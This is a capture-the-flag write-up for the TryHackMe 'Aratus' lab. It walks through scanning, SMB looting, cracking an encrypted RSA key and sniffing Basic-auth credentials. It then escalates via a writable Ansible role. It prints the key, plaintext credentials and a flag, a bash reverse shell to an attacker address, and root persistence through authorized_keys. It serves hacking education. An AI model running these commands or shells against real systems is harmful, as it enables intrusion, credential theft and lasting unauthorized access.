# Aratus
[https://tryhackme.com/room/aratus](https://tryhackme.com/room/aratus)

## Enumeration
`sudo rustscan --range 1-65535 --ulimit 5000 -a $ip -- -sC -sV`

OS: Centos

| Port | Service |
| - | - |
| 21 | FTP - vsftpd 3.0.2 |
| 22 | SSH - OpenSSH 7.4 |
| 80 | HTTP - Apache httpd 2.4.6 |
| 139 | SMB - Samba smbd 3.X - 4.X |
| 443 | HTTPS Apache httpd 2.4.6 |

### SMB
- Anonymous login enabled

Potential Usernames: 
- Simeon
- Theodore

Message from to Simeon says he has an insecure password - will attempt to bruteforce SSH

### SSH Bruteforce
`hydra -l Simeon -P /usr/share/wordlists/rockyou_utf8.txt $ip ssh -t 64`

Ended up being a rabbit hole, unable to bruteforce.

### Lots of reading
I downloaded all the dirs and files from SMB on the server to my local machine and instead of reading through them all and found a private key with a password.

However after looking at this again at a later date I found that LinPeas would have found this RSA key as well.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,596088D0C0C3E6F997CF39C431816A88

5t3gTvBBx3f871Au/57hicjw646uQzz+SOfHtmUGL8IvojzDAgC72IX20qg717Dl
xD+jjENQUEB60dsEbPtzc9BatTZX6kQ9B0DXVEY63v/8wHb4Aq6g5WwgGNH6Nq6y
hIpylfVflBTnYpdSSIHnTdqzgzzHuOotLGoQJOrwO8IvmdlId7/dqpLgCY6jQMB8
nYYbkwwcyXcyt7ouZNfb3/eIp6afHW8g9cC2M9HIYLAtEIejxmcCqF2XjYIekZ/L
TI5EVrPOnLZeT5N6byAtODlIPJyJRE3gIiS1tTPxxOjBl6/7lEDQ49eIz5mCHxOz
BrIfgjaTRTPC1G6b+QAS9S1dleqNE4j5+FUsYpJDLan+WCgGc6oFgBjTTz96UB7M
qduRY8O+bW36OJhQh3hCxfZevCSa5ug6hH+q43XP0O9UkUL8U4/1dFLa4RI9cjIK
D3ythFCQUzT4RKMoW+F1528Fhro0lPRgc6XfhJu/zs3gr6yIiaolIE+YVOB92IBx
Xu6kBRLPct6Gj7lFSnISYa+Vu5UyQNUNP+Ezk9GgeK/PGwMd2sfLW79PKyhl4iXZ
ymkbHWAfgHk+kmY/+EPgdgf9VyglYOjx5hBopEpPlfuZb/X/PZTO8CYxltYHiJtn
FCjnVV9rH6oUBgaA2yspo22OEi8QdSoGzUrz9TgdStxls20vTuYuwll8rhyZu7OR
ehXskDrvxAnptNzHyLjj800W4/X7jUltuA3jfvEYLGFeLyeP3Cg/IFnXbv+4H3ca
TxTnFUNY9t8DsnYiaHgbKTx7XpVwGATI+Wn3cT558xIvPhipge2lso5d0KTLP2Nn
kLlwlcSQp393GvUlJ7e9Gd1KkoZvk6wxjWB0ZxOSte/HJJooXfNF7/8p3v9Y++iX
NVNA/vu4o8C8TfKgq91cm+j13s/WNV1g8TXqbI9TU/YW4ZEEeemJFA0hd0eQvZvR
C4z/qJZH8MhBB6VIVn4l0uhNKHehaZCoGUtR28IzIctz96CJnwl3DbMKWX8c7mx0
s+1rJAjjcKxFS7lxPiCID6j/hZvsdjXnPScH2e/lQ1bMUk2rOCsDKCKeY0YGCkvI
H51/oW3qCjUx7Rtnf8RKu16uMDMBqDFYc795QoFmz9SAe7tCHmtKyZw1rI8x4G2I
rzptsqT3tW+hMrlqBM8wxksKfnhQE8h06tJKSusv12BabgkCNuk9CuD9D7yfgURI
hKXIf7SYorLBo7aBDXxwPZzanqNPsicL03Pbcv6LK18nubBd4nN9yLJB7ew0Q2WC
d19y9APjMKqoOUkXFtVhUFH5RQH7cDzoK1MZEZzMG7DKs496ZkDXxNJP6t5LiGmi
LIGlrXjAbf/+4/2+GNmVUZ+7xXhtM08hj+U5W0StmD7UGa/kVbwsdgBoUztz91wC
byotvP69b/oQBbzs/ZZSKJlAu2OhNGgN1El4/jhCHWcs5+1R1tVcAbZugdvPH2qK
rTePu5Dh58RV3mdmw7IyxdRzD95mp7FOnw6k+a7tZpghYLnzHH6Xrpor28XZilLT
aWtaV/4FhBPopJrwjq5l67jIYXILd+p6AXTZMhJp0QA53unDH8OSSAxc1YvmoAOV
-----END RSA PRIVATE KEY-----
```

From here I used ssh2john to extract the hash and then attempted to crack it using `john --wordlist=/usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt hash.txt`

This found the password for the ssh key to be "testing123".

I accessed the machine through ssh as simeon using the rsa key that I found along with the cracked password.

### Privilege Escalation
After gaining a foothold on the simeon user I decided to ran linpeas which identified tcpdump as a potentially useful.

I decided to sniff the traffic on the machine's loopback interface using `tcpdump -i lo port not 22 and host not [my vpn ip] -v`

I saw it make GET request to  /test-auth/index.html with the header `Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=`

`dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=` when decoded from base64 becomes `theodore:Rijyaswahebceibarjik` 

I take these credentials and use su to log into the theodore user.

From here I have found the first flag: THM{ba8d3b87bfdb9d10115cbe24feabbc20}

### Enumeration
First I checked sudo privileges on Thedore by running `sudo -l` which showed me:

(automation) NOPASSWD: /opt/scripts/infra_as_code.sh

Meaning we can run `sudo -u automation /opt/scripts/infra_as_code.sh` to run this script as the automation user (maybe we can gain a foothold into this account?)

/opt/scripts/infra_as_code.sh
```sh
#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
```

From here I googled "Ansible Privilege Escalation" to find some more information as I wasn't familiar and I found a [blog post by Digital Ocean](https://www.digitalocean.com/community/tutorials/understanding-privilege-escalation-in-ansible-playbooks) about using Playbooks to escalate privileges. Conveniently, they are used here.

First I check to see if there are any vulnerable documents
```
cd /opt/ansible/playbooks
grep -rin "become:" /opt/ansible/playbooks/
	# /opt/ansible/playbooks/httpd.yaml:4:  become: true
```

/opt/ansible/playbooks/httpd.yaml
> -rw-r--r--.
```
---
- name: Install and configure Apache
  hosts: all
  become: true
  roles:
    - role: geerlingguy.apache
  tasks:
    - name: configure firewall
      firewalld:
        service: "{{ item }}"
        state: enabled
        permanent: yes
        immediate: yes
      loop:
        - http
        - https
...
```

Since I don't have the ability to edit this file directly I decide to look into the role `geerlingguy.apache` which is stored in /opt/ansible/roles/geerlingguy.apache then from here I can see that there is a task running called "configure firewall" so I check the tasks directory within the role and check the files.

```
   0 drwxr-xr-x. 2 automation automation  228 Dec  2 11:55 .
   0 drwxr-xr-x. 9 automation automation  178 Dec  2 11:55 ..
4.0K -rw-rw-r--. 1 automation automation 1.7K Dec  2 11:55 configure-Debian.yml
4.0K -rw-rw-r--+ 1 automation automation 1.1K Dec  2 11:55 configure-RedHat.yml
4.0K -rw-rw-r--. 1 automation automation  546 Dec  2 11:55 configure-Solaris.yml
4.0K -rw-rw-r--. 1 automation automation  711 Dec  2 11:55 configure-Suse.yml
4.0K -rw-rw-r--. 1 automation automation 1.4K Dec  2 11:55 main.yml
4.0K -rw-rw-r--. 1 automation automation  193 Dec  2 11:55 setup-Debian.yml
4.0K -rw-rw-r--. 1 automation automation  198 Dec  2 11:55 setup-RedHat.yml
4.0K -rw-rw-r--. 1 automation automation  134 Dec  2 11:55 setup-Solaris.yml
4.0K -rw-rw-r--. 1 automation automation  133 Dec  2 11:55 setup-Suse.yml
```

There is a file called configure-RedHat.yml that has slightly different privileges to the others: `-rw-rw-r--+` this indicates that there is an access control list that can grant additional permissions on this resource.

I run `getfacl configure-RedHat.yml` to find out what privileges are available to us and find the following:
```
# file: configure-RedHat.yml
# owner: automation
# group: automation
user::rw-
user:theodore:rw-
group::rw-
mask::rw-
other::r--
```

Our user (Theodore) has read and WRITE access to this file.

I first create a reverse shell script in /tmp which I plan on utilizing and making it executable by running `echo "bash -i >& /dev/tcp/<my vpn ip>/4242 0>&1" > /tmp/shell.sh && chmod 777 /tmp/shell.sh`

I then start a netcat listener on my machine `nc -lvnp 4242` and on the target machine I run `sudo -u automation /opt/scripts/infra_as_code.sh`

From here I recieve a shell as root and added my RSA public key to the root user's authorized keys to persist my connection.